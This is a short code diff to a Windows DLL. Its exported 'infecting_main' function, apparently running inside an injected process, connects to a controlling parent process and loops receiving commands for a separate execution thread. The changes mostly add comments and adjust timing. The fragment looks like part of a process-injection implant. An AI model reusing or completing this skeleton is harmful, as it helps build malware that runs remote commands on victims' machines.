@@ -21,16 +21,19 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 
 extern "C" __declspec(dllexport) void infecting_main()
 {
-	Sleep(1000);
+	/* wait for parent process to */
+	Sleep(2000);
+
 	/* locals */
 	HANDLE action_thread;
 	u_char buffer[100];
 	size_t buf_size = sizeof buffer;
-	pCommand p;
+	pCommand p = (pCommand)(buffer + sizeof(int));
 
 	//connect to the parnet process
 	connect_to_parent_process();
 
+	/* command execution thread */
 	action_thread = CreateThread(
 		NULL,
 		0,
@@ -40,15 +43,16 @@ extern "C" __declspec(dllexport) void infecting_main()
 		NULL
 	);
 
+	/* passing commands to to the execution thread */
 	for (;;)
 	{
 		//wait for command from parent process
 		get_command(buffer, buf_size);
 
-		p = (pCommand)(buffer + sizeof(int));
-		
+		/* add the command */
 		add_command(p);
 
+		/* sleep for a second */
 		Sleep(1000);
 	}
 }
